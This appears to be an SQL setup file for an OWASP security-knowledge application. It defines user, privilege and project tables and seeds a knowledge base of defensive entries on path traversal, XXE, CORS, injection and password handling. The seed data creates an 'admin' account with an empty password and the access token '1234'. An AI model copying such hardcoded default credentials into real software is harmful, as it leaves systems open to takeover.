--
-- Table structure for table `logs`
--
drop table if exists `logs`;
CREATE TABLE `logs` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT,
`date` varchar(255) NOT NULL,
`time` varchar(255) NOT NULL,
`threat` varchar(255) NOT NULL,
`ip` varchar(255) NOT NULL,
`status` varchar(255) NOT NULL,
`message` varchar(255) NOT NULL
);


--
-- Table structure for table `users`
--
drop table if exists `users`;
CREATE TABLE `users` (
`userID` INTEGER PRIMARY KEY AUTOINCREMENT,
`privilegeID` int(11) NOT NULL,
`userName` varchar(255) NOT NULL UNIQUE,
`email` varchar(255) ,
`password` varchar(255) NOT NULL,
`accessToken` varchar(255),
`activated` varchar(255),
`access` varchar(255) NOT NULL
);


INSERT OR REPLACE INTO `users` (`userID`, `privilegeID`, `username`, `password`, `accessToken`, `access`, `activated`, `email`) VALUES (1, 1, "admin", "", "1234", "false", "false", "example@owasp.org");


--
-- Table structure for table `privileges`
--
drop table if exists `privileges`;
CREATE TABLE `privileges` (
`privilegeID` INTEGER PRIMARY KEY AUTOINCREMENT,
`privilege` varchar(255) NOT NULL
);

INSERT OR REPLACE INTO `privileges` (`privilegeID`, `privilege`) VALUES (1, "edit:read:manage:delete");
INSERT OR REPLACE INTO `privileges` (`privilegeID`, `privilege`) VALUES (2, "edit:read:delete");
INSERT OR REPLACE INTO `privileges` (`privilegeID`, `privilege`) VALUES (3, "edit:read");
INSERT OR REPLACE INTO `privileges` (`privilegeID`, `privilege`) VALUES (4, "read");


--
-- Table structure for table `projects`
--
drop table if exists `projects`;
CREATE TABLE `projects` (
`projectID` INTEGER PRIMARY KEY AUTOINCREMENT,
`userID` int(11) NOT NULL,
`groupID` int(11) NOT NULL,
`projectName` varchar(250) NOT NULL,
`projectVersion` varchar(250) NOT NULL,
`projectDesc` text NOT NULL,
`ownerID` int(11) NOT NULL,
`timestamp` timestamp NOT NULL
);

--
-- Table structure for table `groups`
--
drop table if exists `groups`;
CREATE TABLE `groups` (
`groupID` INTEGER PRIMARY KEY AUTOINCREMENT,
`ownerID` int(11) NOT NULL,
`groupName` varchar(250) NOT NULL,
`timestamp` timestamp
);

INSERT OR REPLACE INTO `groups` (`groupID`, `ownerID`, `groupName`) VALUES (1, 1, "adminGroup");


--
-- Table structure for table `groupmembers`
--
drop table if exists `groupmembers`;
CREATE TABLE `groupmembers` (
`memberID` INTEGER PRIMARY KEY AUTOINCREMENT,
`userID` int(11) NOT NULL,
`groupID` int(11) NOT NULL,
`ownerID` int(11) NOT NULL,
`timestamp` timestamp
);

INSERT OR REPLACE INTO `groupmembers` (`memberID`, `userID`, `groupID`, `ownerID`) VALUES (1, 1, 1, 1);

--
-- Table structure for table `kb_items`
--
drop table if exists `kb_items`;
CREATE TABLE `kb_items` (
`kbID` INTEGER PRIMARY KEY AUTOINCREMENT,
`title` varchar(250) NOT NULL,
`content` varchar(900) NOT NULL
);
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Filename Injection / Path TraversalNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEA Path Traversal attack aims to access files and directories that are stored outsideNEWLINEthe web root folder. By browsing the application, the attacker looks for absolute linksNEWLINEto files stored on the web server.  By manipulating variables that reference files withNEWLINEdot-dot-slash (../); sequences and its variations, it may be possible to access arbitraryNEWLINEfiles and directories stored on file system, including application source code,configurationNEWLINEand critical system files, limited by system operational access control.NEWLINENEWLINEThe attacker uses ../../ sequences to move up to root directory, thus permitting navigationNEWLINEthrough the file system. This attack can be executed with an external malicious code injectedNEWLINEon the path, like the Resource Injection attack.NEWLINENEWLINE## Solution:NEWLINENEWLINEThe most effective solution to eliminate file inclusion vulnerabilities is to avoid passingNEWLINEuser-submitted input to any filesystem/framework API. If this is not possible the applicationNEWLINEcan maintain a white list of files, that may be included by the page, and then use an identifierNEWLINE(for example the index number) to access to the selected file. Any request containing an invalidNEWLINEidentifier has to be rejected, in this way there is no attack surface for malicious users toNEWLINEmanipulate the path.NEWLINE', 'Filename injection Path traversel'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# External DTD parsingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEProcessing of an external entity containing tainted data may lead to disclosure ofNEWLINEconfidential information and other system impacts.NEWLINEThe XML 1.0 standard defines the structure of an XML document.NEWLINEThe standard defines a concept called an entity, which is a storage unit of some type.NEWLINEThere exists a specific type of entity, an external general parsed entity often shortenedNEWLINEto an external entity, that can access local or remote content via a declared systemNEWLINEidentifier. The system identifier is assumed to be a URI that can be dereferencedNEWLINE(accessed) by the XML processor when processing the entity.NEWLINENEWLINEThe XML processor thenNEWLINEreplaces occurrences of the named external entity with the contents dereferenced by theNEWLINEsystem identifier. If the system identifier contains tainted data and the XML processorNEWLINEdereferences this tainted data, the XML processor may disclose confidential informationNEWLINEnormally not accessible by the application. Attacks can include disclosing local files,NEWLINEwhich may contain sensitive data such as passwords or private user data,NEWLINEusing file: schemes or relative paths in the system identifier.NEWLINENEWLINESince the attack occurs relative to the application processing the XML document,NEWLINEan attacker may use this trusted application to pivot to other internal systems,NEWLINEpossibly disclosing other internal contentNEWLINEvia http(s) requests. In some situations, an XML processor library that is vulnerableNEWLINEto client-side memory corruption issues may be exploited by dereferencing a malicious URI,NEWLINEpossibly allowing arbitrary code execution under the application account. Other attacksNEWLINEcan access local resources that may not stop returning data, possibly impacting applicationNEWLINEavailability if too many threads or processes are not released.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEDisable the XML DTD parsing. This can be set when initiating the XML parser.NEWLINE', 'External DTD parsing'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Log injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINELog injection problems are a subset of injection problem, in which invalid entries takenNEWLINEfrom user input are inserted in logs or audit trails, allowing an attacker to misleadNEWLINEadministrators or cover traces of attack. Log injection can also sometimes be used toNEWLINEattack log monitoring systems indirectly by injecting data that monitoring systems willNEWLINEmisinterpret.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEYou should consider these three controls when implementing logging systems.NEWLINENEWLINE- Design: If at all possible, avoid logging data that came from external inputs.NEWLINENEWLINE- Implementation: Ensure that all log entries are statically created, or if they mustNEWLINErecord external data that the input is vigorously white-list checked.NEWLINENEWLINE- Run time: Avoid viewing logs with tools that may interpret control characters in theNEWLINEfile, such as command-line shells.NEWLINENEWLINEAlso verify that all non-printable symbols and field separators are properly encoded in log entries,NEWLINEto prevent log injection.NEWLINE', 'Log injection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# CA certificatesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIn cryptography, a certificate authority or certification authority (CA) is an entity thatNEWLINEissues digital certificates. A digital certificate certifies the ownership of a public keyNEWLINEby the named subject of the certificate. Sometimes it happens that a CA goes bad and isNEWLINErevoked from the browser. This will lead to untrusted TLS connections if your applicationNEWLINEuses an issued certificate from this CA.NEWLINENEWLINE## Solution:NEWLINENEWLINEIt''s always a good idea to let multiple CA you trust create a certificate,NEWLINEbest way is that you create yourself the key pair (pub & priv) and let the CA sign it.NEWLINEThis way you don''t need to ''leak'' your priv key and you have backup trustedNEWLINEcertificates you can use as a backup when one goes ''bad''.NEWLINE', 'CA certificates'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# All connections should be TLSNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an application provides TLS, all connections should be TLS otherwise theNEWLINEencryption will be lost.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that TLS is used for all connectionsNEWLINE(including both external and backend connections) that are using authentication tokens orNEWLINEthat involve sensitive data or functions.NEWLINEThis should also be enforced in the application itself wherever possible,NEWLINEfor example: Secure flags on cookies, HSTS, certificate pinning etc.NEWLINE', 'All connections should be TLS'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Log TLS connection failuresNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEFailing TLS connections should always be logged. This is a great indicator that ''something'' is wrong.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that backend TLS connection failures are logged.NEWLINE', 'Log TLS connection failures'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Content type headersNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINESetting the right content headers is important for hardening your applications security,NEWLINEthis reduces exposure to drive-by download attacks or sites serving user uploadedNEWLINEcontent that, by clever naming could be treated by MS Internet Explorer as executable orNEWLINEdynamic HTML files and thus can lead to security vulnerabilities.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAn example of a content type header would be:  NEWLINENEWLINE    Content-Type: text/html; charset=UTF-8NEWLINE    or:NEWLINE    Content-Type: application/json;NEWLINE', 'Content type headers'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Malicious intentNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEBefore pushing a code live you should check the software for malicious code in order toNEWLINEmake sure no developers with evil intent made backdoors or deliberately put in exploits.NEWLINEThe same goes for whenever you are using third-part software and components.NEWLINENEWLINEAlso verify, that third party components come from trusted repositories.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINERunning your code through a static code analyzer or auditing tools could give you a changeNEWLINEto find malicious pieces of code which could be embedded into the software.NEWLINEAlso if the new or adjusted functionality is critical then check manually it in the formNEWLINEof a code review for back doors, Easter eggs, and logic flaws.NEWLINENEWLINEThis should also mean that authorized administrators must have the capability to verify the integrity ofNEWLINEall security-relevant configurations to ensure that they have not been tampered with.NEWLINE', 'Malicious intent'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# SandboxingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEA sandbox is a security mechanism for separating running programs.NEWLINEIt is often used to execute untested code, or untrusted programs fromNEWLINEunverified third parties, suppliers, untrusted users and untrusted websites. It''s creatingNEWLINEan extra layer of security where an attacker first need to break out from.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEUse the sandbox attribute of an iframe for untrusted content. The sandbox attribute of anNEWLINEiframe enables restrictions on content within a iframe. The following restrictions areNEWLINENEWLINEActive when the sandbox attribute is set:NEWLINENEWLINE- All markup is treated as being from a unique originNEWLINE- All forms and scripts are disabled.NEWLINE- All links are prevented from targeting other browsing contextsNEWLINE- All features that triggers automatically are blockedNEWLINE- All plugins are disabledNEWLINENEWLINEIt is possible to have a fine-grained control over iframe capabilities using the value ofNEWLINEthe sandbox attribute. In old versions of user agents where this feature is not supported,NEWLINEthis attribute will be ignored. Use this feature as an additional layer of protection orNEWLINEcheck if the browser supports sandboxed frames and only show the untrustedNEWLINEcontent if supported. Apart from this attribute, to prevent Clickjacking attacks andNEWLINEunsolicited framing it is encouraged to use the header X-Frame-Options which supportsNEWLINEthe deny and same-origin values. Other solutions like framebusting:NEWLINENEWLINE```javascriptNEWLINEif(window!== window.top) { window.top.location = location; }NEWLINE#Only for legacy browser supportNEWLINE```NEWLINE', 'Sandboxing'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Repudiation attackNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEA repudiation attack happens when an application or system does not adopt controls toNEWLINEproperly track and log users actions, thus permitting malicious manipulation or forgingNEWLINEthe identification of new actions. This attack can be used to change the authoringNEWLINEinformation of actions executed by a malicious user in order to log wrong data to log files.NEWLINEIts usage can be extended to general data manipulation in the name of others,NEWLINEin a similar manner as spoofing mail messages. If this attack takes place, the data storedNEWLINEon log files can be considered invalid or misleading.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThis type of data should always be processed out of reach of the user and should beNEWLINEverified and enforced server-side.NEWLINE', 'Repudiation attack'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Server-side validationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever the application is processing high value business logic parameters these valuesNEWLINEshould always be processed out of reach of the users and validated against expectedNEWLINEvalues on the server.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify the application does not allow high value business logic parameters to beNEWLINEtampered with. The users should not be able to have control over this value, recommendedNEWLINEis to process this data server-side and validate the data to see if it returns expectedNEWLINEvalues. If not these failures should be logged.NEWLINENEWLINEAlso important to always verify that the same access control rules implied by the presentation layerNEWLINEare enforced on the server-side.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Input validationNEWLINE- Input rejectionNEWLINE- Single input validation classNEWLINE- Character encodingNEWLINE- Client side input validationNEWLINE', 'Server side validation'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Privilege escalationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIn every portion of the application where a user can create information in the databaseNEWLINE(e.g., making a payment, adding a contact, or sending a message), then he can receiveNEWLINEinformation (statement of account, order details, etc.), or delete informationNEWLINE(drop users, messages, etc.), it is necessary to record that functionality.NEWLINEThe tester should try to access such functions as another user in order to verify if it isNEWLINEpossible to access a function that should not be permitted by the users role/privilegeNEWLINE(but might be permitted as another user).NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEChecking if a user has enough authorization to execute certain request should always beNEWLINEenforced on the server-side. Also you may to apply the Principle of Least privilege,NEWLINEthe principle of least privilege recommends that accounts have the least amount ofNEWLINEprivilege required to perform their business processes. This encompasses user rights,NEWLINEresource permissions such as CPU limits, memory, network, and file system permissions.NEWLINEFor example, if a user server only requires access to the network, read access to aNEWLINEdatabase table, and the ability to write to a log, this describes all the permissionsNEWLINEthat should be granted. Under no circumstances should the user be granted administrativeNEWLINEprivileges. Also for making testing easier you can create Unit-tests that verifies theNEWLINEuser role permissions.NEWLINE', 'Privilege escalation'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# LDAP injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINELDAP Injection is an attack used to exploit web based applications thatNEWLINEconstruct LDAP statements based on user input. When an application fails to properlyNEWLINEsanitise user input, it is possible to modify LDAP statements using a local proxy.NEWLINEThis could result in the execution of arbitrary commands such as granting permissions toNEWLINEunauthorised queries, and content modification inside the LDAP tree.NEWLINEThe same advanced exploitation techniques available in SQL Injection can be similarlyNEWLINEapplied in LDAP Injection.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe best way to prevent LDAP injection is to use a positive validation scheme for ensuringNEWLINEthat the data going into your queries does not contain any attacks. However, in some cases,NEWLINEit is necessary to include special characters in input that is passed into an LDAP query.NEWLINEIn this case, using escaping can prevent the LDAP interpreter from thinking those specialNEWLINEcharacters are actually LDAP query.NEWLINE', 'LDAP injection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Enforce sequential step orderNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an functionality consists out of following several steps to achieve some goal i.e,NEWLINENEWLINEUser adds items to chart -> User enters shipping information -> User pays for goods -> Items will be shipped.NEWLINEYou want to make sure the user can not skip the payment step in order to receive his goods.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEIn order to verify that this stage was run through by a sincere user you want to enforceNEWLINEthe application to only process business logic flows in sequential step order, with allNEWLINEsteps being processed in realistic human time, and not process out of order, skipped steps,NEWLINEprocessed steps from another user, or too quickly submitted transactions.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Aggregate user requestsNEWLINE- CSRF injectionNEWLINE', 'Enforce sequential step order'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Step up or adaptive authenticationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever a user browses a section of a web based application that contains sensitiveNEWLINEinformation the user should be challenged authenticate again using a higher assuranceNEWLINEcredential to be granted access to this information.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify the application has additional authorizationNEWLINE(such as step up or adaptive authentication) so the user is challenged before beingNEWLINEgranted access to sensitive information. This rule also applies for making criticalNEWLINEchanges to an account or action.NEWLINENEWLINEThis also means that the adaptation of authentication hasNEWLINEto be implemented in such a manner that the application correctly enforces context-sensitiveNEWLINEauthorization so as to not allow unauthorized manipulation by means of in example, parameter tampering.NEWLINE', 'step up or adaptive authentication'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Cross origin resource sharingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINECross Origin Resource Sharing or CORS is a mechanism that enables a web browser to performNEWLINE''cross-domain'' requests using the XMLHttpRequest L2 API in a controlled manner.NEWLINEIn the past, the XMLHttpRequest L1 API only allowed requests to be sent within the sameNEWLINEorigin as it was restricted by the same origin policy.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINECross-Origin requests have an Origin header, that identifies the domain initiating theNEWLINErequest and is always sent to the server. CORS defines the protocol to use between a webNEWLINEbrowser and a server to determine whether a cross-origin request is allowed. In order toNEWLINEaccomplish this goal, there are a few HTTP headers involved in this process,NEWLINEthat are supported by all major browsers:NEWLINENEWLINE- OriginNEWLINE- Access-Control-Request-MethodNEWLINE- Access-Control-Request-HeadersNEWLINE- Access-Control-Allow-OriginNEWLINE- Access-Control-Allow-CredentialsNEWLINE- Access-Control-Allow-MethodsNEWLINE- Access-Control-Allow-HeadersNEWLINENEWLINEThings you must consider when using CORSNEWLINENEWLINE1. Validate URLs passed to XMLHttpRequest.open. Current browsers allow these URLs to beNEWLINEcross domain; this behavior can lead to code injection by a remote attacker. Pay extraNEWLINEattention to absolute URLs.NEWLINENEWLINE2. Ensure that URLs responding with Access-Control-Allow-Origin: * do not include anyNEWLINEsensitive content or information that might aid attacker in further attacks.NEWLINEUse the Access-Control-Allow-Origin header only on chosen URLs that need to beNEWLINEaccessed cross-domain. Don''t use the header for the whole domain.NEWLINENEWLINE3. Allow only selected, trusted domains in the Access-Control-Allow-Origin header.NEWLINEPrefer white-listing domains over blacklisting or allowing any domainNEWLINE(do not use * wildcard nor blindly return the Origin header content without any checks)NEWLINENEWLINE4. Keep in mind that CORS does not prevent the requested data from going to anNEWLINEunauthenticated location. It''s still important for the server to perform usualNEWLINECSRF prevention.NEWLINENEWLINE5. While the RFC recommends a pre-flight request with the OPTIONS verb, currentNEWLINEimplementations might not perform this request, so it''s important that "ordinary"NEWLINE(GET and POST) requests perform any access control necessary.NEWLINENEWLINE6. Discard requests received over plain HTTP with HTTPS origins to prevent mixedNEWLINEcontent bugs.NEWLINENEWLINE7. Don''t rely only on the Origin header for Access Control checks. Browser always sendsNEWLINEthis header in CORS requests, but may be spoofed outside the browser.NEWLINEApplication-level protocols should be used to protect sensitive data.NEWLINENEWLINE**NOTE:** Always make sure that even though you have set the allow origin header to trusted sources, youNEWLINEhave to make authentication/session management before displaying sensitive information.NEWLINE', 'Cross origin resource sharing'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Prevent password leakingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an users password is displayed on screen or send by email, an attacker gains theNEWLINEopportunity of compromising the password since it is displayed or sent in plain text.NEWLINESince the password is displayed on screen it could even be copied simply by looking at it.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINENever display passwords on screen in an unprotected matter since this could easily leadNEWLINEto the password being compromised.NEWLINESome practices are for you to:NEWLINENEWLINE- set input field type to password.NEWLINE- Set autocomplete=off for the password input field.NEWLINENEWLINEThis turns off the auto complete and remember password features of the browser.NEWLINENEWLINE## NOTE:NEWLINEFor some browsers this means you have to put all the input fields the form containsNEWLINEto autocomplete=off, otherwise it will not comply.NEWLINENEWLINEAlso whenever a user has the opportunity to use password forget functionsNEWLINEyou should send a reset link rather than a new auto-generated password.NEWLINE', 'Prevent password leaking'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# All authentication controls must fail securelyNEWLINE-------NEWLINENEWLINE## Description:NEWLINEHandling errors securely is a key aspect of secure coding.NEWLINEThere are two types of errors that deserve special attention. The first is exceptionsNEWLINEthat occur in the processing of a security control itself. It''s important that theseNEWLINEexceptions do not enable behavior that the countermeasure would normally not allow.NEWLINEAs a developer, you should consider that there are generally three possible outcomesNEWLINEfrom a security mechanism:NEWLINENEWLINE1. allow the operationNEWLINE2. disallow the operationNEWLINE3. exceptionNEWLINENEWLINEIn general, you should design your security mechanism so that a failure will follow the same execution pathNEWLINEas disabling the operationNEWLINENEWLINE## Solution:NEWLINENEWLINEMake sure all the access control systems are thoroughly tested for failing securely beforeNEWLINEusing it in your application. It is common that complete unit-test are created especiallyNEWLINEfor this purpose.NEWLINE', 'All authentication controls must fail securely'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Forget password functionsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever a user forgets his password and your application provides a passwordNEWLINEforget functionality or any other type of recovery pathsNEWLINEthere are a couple of things to take into consideration when you want to harden itsNEWLINEsecurity.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe forget password function should never send a new password by email but should containNEWLINEa reset link with a token which is valid for a limited amount of time.NEWLINEAdditional authentication based on soft-tokensNEWLINE(e.g. SMS token, native mobile applications, etc.) can be required as well before theNEWLINElink is sent over. Also make sure whenever such a recovery cycle is started, theNEWLINEapplication does not reveal the users current password in any way.NEWLINENEWLINERecommended knowledge-base items:NEWLINENEWLINE- Prevent password leakingNEWLINE- Disallow the use of old passwordsNEWLINE- Predictable password and/or token generationNEWLINE', 'Forget password functions'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Aggregate access control protectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINE Verify the system can protect against aggregation or continuous access ofNEWLINE secured functions, resources, or data. For example, possibly by the use of aNEWLINE resource governor to limit the number of edits per hour or to prevent the entire databaseNEWLINE from being scraped by an individual user.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe system should contain a counter which can keep up with the number of times a certainNEWLINEusers addresses database tables and should be rejected when he passes a reasonable number.NEWLINEThis violation should also be reported since it could indicate an attacker scraping yourNEWLINEtable contents and stealing company information.NEWLINE', 'Aggregate access control protection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Canonicalization of user inputNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever user-input is partially validated there is a high probability that the applicationNEWLINEmisses a malicious input which could execute into a successful attack on your application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAll user-input should be validated whenever the user-input string is complete and is beingNEWLINEprocessed by your application.NEWLINE', 'Canonicalized user input'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Approved random number generatorNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe lack of entropy available for, or used by, a pseudo-random number generator can be aNEWLINEstability and security threat.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAll random numbers, random file names, random GUIDs, and random must be generated usingNEWLINEthe cryptographic module''s approved random number generator when these random values areNEWLINEintended to be unguessable/unpredictable by an attacker.NEWLINE', 'Approved random number generator'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Validated cryptographic modulesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe National Institute of Standards and Technology (NIST) issued the FIPS 140 PublicationNEWLINESeries to coordinate the requirements and standards for cryptography modules that includeNEWLINEboth hardware and software components. Protection of a cryptographic module within aNEWLINEsecurity system is necessary to maintain the confidentiality and integrity of theNEWLINEinformation protected by the module.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that cryptographic modules used by the application have been validated againstNEWLINEFIPS 140-2 or an equivalent standard.NEWLINE', 'Validated cryptographic modules'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# SSI injectionsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWeb servers usually give developers the ability to add small pieces of dynamic code insideNEWLINEstatic HTML pages, without having to deal with full-fledged server-sideNEWLINEor client-side languages.NEWLINENEWLINEThis feature is incarnated by the Server-Side Includes (SSI).NEWLINEThe attacker will try to inject code into the application that willNEWLINEbe interpreted by SSI mechanisms. A successful exploitation of this vulnerabilityNEWLINEallows an attacker to inject code into HTML pages or even perform remote code execution.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe SSI handler on the web-server should not be activated when it is not used.NEWLINE', 'SSI injections'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Policy for managing cryptographic keysNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen there is no policy for managing your cryptographic keys, expired or revoked keysNEWLINEthat could unknowingly be used again thus becoming a threat for your encrypted data.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that there is an explicit policy for how cryptographic keys are managedNEWLINE(e.g., generated, distributed, revoked, expired). Verify that this policy is properlyNEWLINEenforced.NEWLINE', 'Policy for managing cryptographic keys'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# HTTPS and weakly or unencrypted linksNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEImagine the scenario where you have a login form and an application which supports HTTPS.NEWLINEWhenever the initial connection (login.php) is not HTTPS and after login (loggedin.php)NEWLINEwill be HTTPS the username and password will not be send through an encrypted manner thusNEWLINEcould be easily compromised by attackers. This principle also applies to sendingNEWLINEvulnerable data towards other unencrypted/weak encrypted links in your application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEDo not traverse unencrypted or weakly encrypted links.NEWLINEAs soon as you allow a single connection to be send over unencrypted lines, theNEWLINEintegrity and confidentiality of your data can no longer be guaranteed.NEWLINENEWLINERecommended knowledge-base items:NEWLINENEWLINE- HTTP strict transport securityNEWLINE- HSTS preloadNEWLINE', 'HTTPS and weakly or unencrypted links'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Error handling on trusted devicesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever error handling is not applied through trusted devices the errors it supplies canNEWLINEnot be trusted since they can be tampered with.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that all error handling is performed on trusted devices.NEWLINE', 'Error handling on trusted devices'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Single application-level loggingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever the application contains a single application-level logging implementation itNEWLINEbecomes clear, transparent and easy to maintain. It also reduces the possibility that youNEWLINEoverlook high priority logging.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that there is a single application-level logging implementation that is used byNEWLINEthe software.NEWLINE', 'Single application level logging'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Aggregate user requestsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEVerify the system can protect against aggregation or continuous access to functions,  NEWLINEresources, or data. For example, possibly by the use of a resource governor to limit theNEWLINEnumber of edits per minute in order to to prevent an automatic attackNEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify the application has the ability to detect and alert on abnormal numbers of requestsNEWLINEfor information or processing high value transactions for that user role, such as screenNEWLINEscraping, automated use of web service extraction, or data loss prevention. For example,NEWLINEthe average user should not be able to access more than 5 records per hour or 30 recordsNEWLINEper day, or add 10 friends to a social network per minute.NEWLINE', 'Aggregate user requests'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Principle of least privilegeNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe principle of least privilege recommends that accounts have the least amount ofNEWLINEprivilege required to perform their business processes. This encompasses user rights,NEWLINEresource permissions such as CPU limits, memory, network, and file system permissions.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe principle means giving a user account only those privileges which are essential toNEWLINEthat users work. For example, a backup user does not need to install software: hence,NEWLINEthe backup user has rights only to run backup and backup-related applications.NEWLINEAny other privileges, such as installing new software, are blocked.NEWLINENEWLINEThe principle applies also to a personal computer user who usually does work in a normalNEWLINEuser account, and opens a privileged, password protected account (that is, a superuser)NEWLINEonly when the situation absolutely demands it.NEWLINENEWLINEThis principle can also be applied to your web-applications. Instead of solely dependingNEWLINEon role based authentication methods using sessions, we rather want to assign privilegesNEWLINEto users by means of a Database-Based Authentication system.NEWLINENEWLINEWe still use sessions in order to identify if the user was logged in correctly, only nowNEWLINEinstead of assigning that user with a specific role we assign him with privileges toNEWLINEverify which actions he is privileged to perform on the system.NEWLINENEWLINEAlso a big pro of this method is, whenever a user has to be assigned less privilegesNEWLINEyour changes will be applied on the fly since the assigning does not depend on the sessionNEWLINEwhich otherwise had to expire first.NEWLINE', 'Principle of least privilege'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# TLS implementation must operate in an approved mode of operationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINETo enforce the maximum amount of security out of the TLS implementation it should alwaysNEWLINEsuffice the approved mode of operation.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESee See http://csrc.nist.gov/groups/STM/cmvp/documents/fips140-2/FIPS1402IG.pdfNEWLINEfor more extended details on how to reach this goal.NEWLINE', 'TLS implementation must operate in an approved mode of operation'); 
